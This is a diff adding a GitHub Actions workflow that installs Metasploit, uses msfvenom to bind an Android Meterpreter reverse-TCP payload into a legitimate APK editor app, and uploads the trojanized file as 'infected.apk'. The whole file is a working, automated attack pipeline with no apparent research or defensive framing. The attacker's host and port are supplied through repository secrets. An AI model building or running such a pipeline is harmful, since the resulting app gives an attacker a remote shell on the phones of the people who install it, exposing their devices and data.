@@ -1,0 +1,33 @@
+name: Inject Metasploit Payload into APK
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  inject_payload:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y metasploit-framework openjdk-8-jdk
+
+    - name: Create directories
+      run: mkdir -p apk-infected
+
+    - name: Inject Metasploit payload into APK
+      run: |
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=${{ secrets.LHOST }} LPORT=${{ secrets.LPORT }} -o /tmp/metasploit.apk
+        msfvenom -x apk-source/apk-editor-1-9-0.apk -k -p android/meterpreter/reverse_tcp LHOST=${{ secrets.LHOST }} LPORT=${{ secrets.LPORT }} -o apk-infected/infected.apk
+
+    - name: Upload infected APK
+      uses: actions/upload-artifact@v3
+      with:
+        name: infected-apk
+        path: apk-infected/infected.apk
